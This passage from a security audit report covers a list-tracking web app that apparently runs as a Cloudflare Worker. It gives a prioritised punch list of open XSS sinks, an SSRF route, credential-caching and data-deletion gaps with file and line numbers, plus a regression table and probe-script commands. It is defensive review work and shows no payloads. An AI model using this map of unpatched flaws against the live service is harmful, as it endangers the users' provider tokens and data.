| `26_…:12` | `authenticateCreator()` | every authenticated request; PBKDF2 + tombstone + throttle | name, key | KV + D1 | **the only auth gate** | — | memoized | 18 ms CPU |
| `03_…:1284` | `isValidAdminCookie()` | the whole admin boundary | cookie | none (stateless) | **admin** | — | none | O(1) |
| `07_…:1699` | `checkForNewEpisodes()` | cron, 150 TMDB calls, per-account isolation | KV accounts | tracking blobs | — | TMDB | cursor+offset | **>50 subrequests** |
| `25_…:3148` | external-list item mutate | forwards user OAuth tokens to three providers | provider, token, item | none | provider-enforced | Trakt/TMDB/MDBList | none | per-item |
| `21_…:629` | `saveLocalCustomListEdit()` | **reports success on failure** | draft items | localStorage + account | owner | — | no guard | list-sized |
| `18_…:133` | `copyListToCustomList()` | **`listName` ReferenceError kills all `list-copy` telemetry** | list url/name | localStorage | — | provider | none | 6,000-item chunks |

---

# File-by-File Punch List

```text
09_page-shell.js
  - [CRITICAL] escape `${initialEntriesJson}` for a <script> context (line 79)

15_tab-settings-html.js
  - [CRITICAL] escapeHtmlServer() the 5 value="${…}" interpolations
               (173 tmdbKey, 203 traktKey, 206 traktUsername, 235 mdblistKey, 263 simklKey)

16_client-row-core.js
  - [CRITICAL] escape for <script>: SERVER_DEEP_LINK_LIST (34), traktAccessToken (39),
               mdblistAccessToken (40), simklAccessToken (41), simklUsername (42),
               serverEntries (49)

25_api-catalog-routes.js
  - [HIGH]     485  `isShow` is unbound -> /lists/curated/:slug always 500
  - [HIGH]     5591 /api/resolve: host allowlist + rate limit for the `url` fallback
  - [HIGH]     5606 /api/resolve: return via jsonPrivate() (currently max-age=3600)
  - [MEDIUM]   2575 `clientId` is unbound -> Trakt /users/me never runs; use TRAKT_CLIENT_ID
  - [MEDIUM]   452  directory fallback emits /lists/Anonymous/<slug> (404); use "user"
  - [MEDIUM]   5714 /api/publish-list has no caller — remove or tighten
  - [LOW]      3909 String() the five body fields (500 + internal error text today)

26_api-creator-and-admin-routes.js
  - [HIGH]     1564 /api/creator/lists: paginate, and stop returning full `items`
  - [HIGH]     3735 /lists/:user/:slug: 404 a creator list whose owner no longer exists
  - [LOW]      1340 /api/creator/reset-key: use 401/429 instead of 200 on failure

02_http-and-creator-utils.js
  - [HIGH]     2845 purgeCreatorData: re-sweep creatorlist: after the identity is removed
  - [MEDIUM]   2171 index:publiclists — shard, or stop writing it on like/unlike
  - [HIGH]     48   isPrivateApiPath: add /api/resolve

18_client-copy-and-trakt-export.js
  - [MEDIUM]   232  `listName` out of scope -> list-copy telemetry never fires

21_client-custom-list-builder.js
  - [MEDIUM]   663  saveLocalCustomListEdit reports success on 401/409/500
  - [MEDIUM]   663, 1320  send expectedUpdatedAt (route via saveCreatorListWithBaseline)

19_client-search-and-likes.js
  - [MEDIUM]   3109 syncCustomListPayload: send expectedUpdatedAt
  - [LOW]      446  runListSearch() is dead

00_constants.js
  - [MEDIUM]   64, 75, 192  comments cite a 1,000-subrequest limit; name both caps and both plans

README.md
  - [MEDIUM]   17   "free Cloudflare Worker" — state what the free plan cannot run
  - [INFO]          document that the install link carries provider tokens (and the Creator Key
                    when Auto-track is on)

.github/workflows/ci.yml + html_checks.py
  - [CRITICAL] add a no-undef scope check over the combined Worker AND the rendered bundle
               (would have caught isShow, clientId and listName)
  - [CRITICAL] add an assertion that no rendered <script> body contains the literal "</script"
               after a hostile render
```

---

# Architectural Root Causes

Individual bugs cluster into four causes. Fixing the cause is worth more than fixing the
symptoms one at a time.

**1. A concatenated single-scope bundle with no scope linting.**
```
isShow (500s a route)  +  clientId (kills Trakt username)  +  listName (kills telemetry)
        ↓
27 files share one top-level scope; a block-scoped const in one route block is
invisible to another, and `catch {}` hides the ReferenceError
        ↓
CI checks that the file PARSES (node --check) and that the page RENDERS,
but never that its identifiers RESOLVE
        ↓
root cause: no `no-undef` pass. One command finds all three.
```

**2. Escaping is applied per-sink by hand, and the server-rendered preamble was never on the list.**
The codebase has three correct escapers and an unusually clear comment about why
`escapeAttr` is wrong inside a JS-in-attribute context. What it does not have is a *rule* that
every interpolation into HTML goes through one. `html_checks.py` verifies handlers resolve and
CSS braces balance; nothing verifies that a hostile value cannot close a tag. Hence: two audits
concluded "no XSS" while six sinks were open.

**3. Cross-cutting policies are enforced at one choke point *and* an enumerated list — and the
list drifts.** `isPrivateApiPath()` is a genuinely good design (the file's own comment: *"a
route added later cannot forget to opt in"*) but it opts in by **prefix**, so `/api/resolve`
— per-account, GET, credential-bearing — sits outside it. Same shape for the SSRF: `/api/preview`
got the allowlist, its sibling did not. **The choke point should classify by what the response
contains, not by where the path happens to start.**

**4. Budgets are sized against a remembered number instead of a checked one.** "1,000
subrequests" appears three times in `00_constants.js`. It is the KV/internal-op cap, not the
outbound-fetch cap, and it is the paid tier, not the free tier the README recommends. Every
free-plan finding in this report traces back to that one un-rechecked constant.

**5. Deletion is modelled as a sweep, not as a state.** `purgeCreatorData` removes what exists
*at the moment it looks*. Anything that authenticated a millisecond earlier writes afterwards
and is never seen again. The read side compounds it: `/lists/:user/:slug` serves a creator list
without ever asking whether the creator still exists.

---

# Previous Audit Regression Analysis

I retested the load-bearing claims rather than trusting the trackers.

| Prior finding | Status now | Evidence |
|---|---|---|
| #1 IDOR: private watch history public | **fixed** | `p05`: `/lists/:user/watchlist` 404 without opt-in |
| #2 `delete-account` deleted nothing | **fixed, with a new gap** | deletes correctly, fails loudly on D1 error — but an in-flight write leaves a public ghost (**new HIGH**) |
| #3 support threads readable by username | **fixed** | `/api/feedback/threads` requires the key |
| #5/#5b D1 split-brain, D1 lockout | **fixed** | `t21_delete_fail.mjs`: 500 + "Nothing has been removed"; KV-first reads |
| #6 14 endpoints 200 on auth failure | **fixed except one** | `p05`: all 19 creator routes 401; `/api/creator/reset-key` still 200 (**LOW**) |
| #8 anonymous unlimited likes | **fixed** | `p25`: 20 identities → exactly 20; ledger holds 20 voters |
| #9 `like-external` unbounded keyspace | **fixed** | host allowlist + sentinel prefixes |
| A/13/14/15 directory truncation, sort, fan-out | **fixed**, one gap | index path correct; the cold fallback emits `/lists/Anonymous/…` (**new MEDIUM**) |
| B admin subrequest wall | **fixed** | dashboard reads the index, no per-account fan-out |
| C `visibility` fail-open | **fixed** | `p12`, `p28`: writes store only `"public"`, reads require `=== "public"` |
| E CORS `*` on state-changing JSON | **fixed** | `json()` is CORS-free; only public paths advertise `*` |
| F `/api/preview` SSRF | **fixed for that route, missed on `/api/resolve`** | `p20` (**new HIGH**) |
| G rate limits fail open | **fixed** | `clientIpKey` rejects a missing `CF-Connecting-IP` |
| I unbounded KV growth | **fixed** | TTLs on feedback/telemetry/search |
| D/11/12 likes column, migrate-d1 | **fixed** | `t01`, `t02` show likes surviving edits and migration |
| 2026-09-06 "false success" class | **fixed server-side, one client instance open** | `saveLocalCustomListEdit` (**new MEDIUM**) |
| 2026-09-06 resurrection / tombstones | **fixed for inheritance, open for public exposure** | `p26`, `p27` (**new HIGH**) |
| 2026-09-06 KV pagination class | **fully closed** | 19 real `.list()` calls audited; see matrix |
| 2026-09-07 FE-02 stored XSS | **fixed at that sink; the class is open at six others** | `p12`, `p13`, `p14` (**new CRITICAL**) |
| 2026-09-07 R2 "no client sends the conflict field" | **fixed for 2 of 12 `lists/save` call sites** | source map above (**new MEDIUM**) |
| 2026-09-05 §14 `bumpStat` lost updates | **accepted, still true** | plus a same-key write-rate problem at scale (**MEDIUM**) |

**No previous fix introduced a regression.** Three prior fixes were correct but reached code
that cannot execute (`recordListCopySlug`'s client caller throws; `/api/creator/sync/share-tracking`
has no UI; the Trakt `/users/me` lookup throws) — that is not a regression, it is a fix that was
never end-to-end tested.

---

# Recommended Fix Order

```text
PHASE 1 — Security blockers (do these before the next shared link is created)
 1. [CRITICAL] Escape all six ${JSON.stringify(...)} into-<script> interpolations
               (16_client-row-core.js 34/39/40/41/42, 09_page-shell.js 79)
 2. [CRITICAL] escapeHtmlServer() the five value="${...}" attributes (15_tab-settings-html.js)
 3. [CRITICAL] CI: add a rendered-page assertion that no <script> body contains "</script"
               after a hostile render — this is what makes 1 and 2 stay fixed
 4. [HIGH]     /api/resolve -> jsonPrivate(), and add /api/resolve to isPrivateApiPath()
 5. [HIGH]     /api/resolve -> https-only + public-host check + per-IP rate limit

PHASE 2 — Data integrity
 6. [HIGH]     purgeCreatorData: re-sweep creatorlist: after the identity is removed
 7. [HIGH]     /lists/:user/:slug: 404 a creator list whose creator record is gone
               (gate on isCreatorList so anonymous lists keep working)
 8. [MEDIUM]   saveLocalCustomListEdit: surface 401/409/500 instead of showing "saved"
 9. [MEDIUM]   Route the three slug-bearing lists/save call sites through
               saveCreatorListWithBaseline so the conflict guard is actually armed

PHASE 3 — Broken features
10. [HIGH]     isShow -> /lists/curated/:slug (one line)
11. [MEDIUM]   clientId -> TRAKT_CLIENT_ID in the Trakt OAuth callback (one line)
12. [MEDIUM]   listName -> created[0].name, so list-copy telemetry can fire
13. [CRITICAL-adjacent] CI: add a no-undef scope pass over the combined Worker AND the
               rendered client bundle — 10, 11 and 12 are all the same defect
14. [MEDIUM]   directory fallback: /lists/user/<slug>, not /lists/Anonymous/<slug>

PHASE 4 — Scalability
15. [HIGH]     /api/creator/lists: add limit/offset, stop returning full `items`
16. [MEDIUM]   Correct the subrequest comments in 00_constants.js (both caps, both plans)
17. [MEDIUM]   README: say what a free Worker cannot run; say D1 is effectively required
18. [MEDIUM]   Chunk /api/bulk-resolve to fit a 50-subrequest budget
19. [MEDIUM]   index:publiclists: stop writing it on like/unlike; shard when lists > ~5,000

PHASE 5 — Hardening and cleanup
20. [LOW]      String() the five /api/external-list/create body fields
21. [LOW]      /api/creator/reset-key: 401/429 instead of 200
22. [MEDIUM]   Decide on /api/publish-list — remove, or tighten and wire up
23. [LOW]      Remove runListSearch(); decide on the item-add/item-remove aliases
24. [LOW]      Give /api/creator/sync/share-tracking a UI, or document it as API-only
25. [INFO]     Document that the install link carries provider tokens and the Creator Key
26. [INFO]     Consider an ADMIN_KEY generation counter so admin sessions can be revoked
```

---

# Reproducing This Audit

```bash
bash verify.sh                                   # baseline: 356 tests, all checks pass
cd audit/adversarial-III-2026-09-08
node p13_browser_xss.mjs                         # CRITICAL, in real Chromium
node p14_browser_xss2.mjs                        # CRITICAL, install-link variant
node p03_curated.mjs                             # HIGH, /lists/curated 500
node p20_ssrf.mjs                                # HIGH, SSRF
node p31_installlink.mjs && node p34_cache.mjs   # HIGH, cacheable credentials
node p27_ghostnatural.mjs                        # HIGH, ghost public lists (6/10)
node p30_breakpoint.mjs                          # HIGH, 990-list KV cap
node p23_subrequests.mjs && node p24_cpu.mjs     # MEDIUM, free-plan limits
node p05_authmatrix.mjs && node p06_adminmatrix.mjs   # clean results
```

`p13`/`p14` need Playwright (`npm i playwright`) and the Chromium at
`/opt/pw-browsers/chromium-*/chrome-linux/chrome`; every other probe needs only Node 22 and the
repo.
